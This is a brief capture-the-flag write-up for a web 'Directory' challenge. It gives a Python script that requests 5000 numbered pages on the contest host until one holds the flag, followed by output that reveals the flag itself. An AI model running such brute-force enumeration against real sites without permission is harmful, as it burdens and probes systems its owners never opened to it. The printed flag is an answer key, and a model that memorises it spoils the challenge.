# Directory
`Web Exploitation` `Directory Bruteforcing`

In this challenge we got a website wih a ton of directory, if I wasn't mistaken it has 4999 directory that contain either a flag or just a text. To finish this chhalenge I create a script with python to print the content of each directory.

**req.py**
```python
import requests
from bs4 import BeautifulSoup

for i in range(5000):
	url = f"https://directory.web.actf.co/{i}.html"
	response = requests.get(url)

	if response.status_code == 200:
		soup = BeautifulSoup(response.content, 'html.parser')
		content = soup.get_text()
		if "your flag is in another file" not in content:
			print(f"Content of {url}: {content}")
			break
		else:
			print(f"{i} doesn't have our flag")
	else:
		print(f"Failed to retrieve content of {url}")
```

After running this python for a while We found the flag

```
3052 doesn't have our flag
3053 doesn't have our flag
Content of https://directory.web.actf.co/3054.html: actf{y0u_f0und_me_b51d0cde76739fa3}```